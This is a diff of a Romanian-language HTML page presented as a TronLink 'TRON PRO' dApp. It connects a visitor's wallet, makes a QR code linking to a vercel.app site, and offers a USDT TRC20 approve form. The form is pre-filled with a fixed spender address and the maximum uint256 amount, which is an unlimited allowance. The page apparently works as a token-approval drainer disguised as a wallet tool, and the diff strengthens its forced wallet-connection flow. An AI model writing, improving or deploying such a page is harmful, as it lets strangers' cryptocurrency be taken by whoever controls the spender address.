@@ -22,7 +22,7 @@ canvas{margin-top:10px}
 <body>
 
 <div class="card">
-<h2>TRON PRO (TronLink)</h2>
+<h2>TRON PRO (TronLink dApp)</h2>
 
 <div id="status" class="bad">Deconectat</div>
 <p><b id="addr">—</b></p>
@@ -32,15 +32,13 @@ canvas{margin-top:10px}
 
 <div class="card">
 <h3>QR dApp</h3>
-
 <button onclick="genQR()">Generează QR</button>
 <canvas id="qr"></canvas>
-
 <pre id="link"></pre>
 </div>
 
 <div class="card">
-<h3>USDT TRC20 Approve</h3>
+<h3>TRC20 APPROVE (USDT)</h3>
 
 <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu"/>
 <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935"/>
@@ -55,42 +53,65 @@ canvas{margin-top:10px}
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4P8otSzgjLj6t";
 let addr = null;
 
-/* =====================
-   QR = DOAR URL
-===================== */
+/* =========================
+   QR (DOAR LINK SITE)
+========================= */
 function genQR(){
   const url = "https://d-app-lake-theta.vercel.app";
   QRCode.toCanvas(document.getElementById("qr"), url);
   document.getElementById("link").innerText = url;
 }
 
-/* =====================
-   CONNECT TRONLINK
-===================== */
+/* =========================
+   CONNECT TRONLINK (REAL FLOW)
+========================= */
 async function connect(){
 
-  if(!window.tronWeb || !window.tronWeb.defaultAddress.base58){
-    alert("Instalează TronLink sau deschide în Brave/Chrome cu extensia activă");
+  if(!window.tronWeb){
+    alert("Instalează TronLink și deschide pagina în Chrome/Brave");
     return;
   }
 
-  addr = window.tronWeb.defaultAddress.base58;
+  try {
 
-  document.getElementById("addr").innerText = addr;
-  document.getElementById("status").className = "ok";
-  document.getElementById("status").innerText = "Conectat TronLink";
+    // force wallet activation popup
+    if(window.tronLink && window.tronLink.request){
+      await window.tronLink.request({ method: "tron_requestAccounts" });
+    }
+
+    let tries = 0;
+    while(tries < 10 && (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58)){
+      await new Promise(r => setTimeout(r, 300));
+      tries++;
+    }
+
+    if(!window.tronWeb.defaultAddress?.base58){
+      alert("Nu s-a conectat wallet-ul");
+      return;
+    }
+
+    addr = window.tronWeb.defaultAddress.base58;
+
+    document.getElementById("addr").innerText = addr;
+    document.getElementById("status").className = "ok";
+    document.getElementById("status").innerText = "Conectat TronLink";
+
+  } catch(e){
+    console.log(e);
+    alert("Eroare conectare TronLink");
+  }
 }
 
-/* =====================
+/* =========================
    CONTRACT
-===================== */
+========================= */
 async function contract(){
   return await window.tronWeb.contract().at(USDT);
 }
 
-/* =====================
-   APPROVE
-===================== */
+/* =========================
+   APPROVE USDT
+========================= */
 async function approve(){
 
   try{
@@ -117,7 +138,7 @@ async function approve(){
 
   }catch(e){
     document.getElementById("out").innerText =
-      "Eroare sau user a refuzat";
+      "Tranzacție anulată / eroare";
   }
 }
 
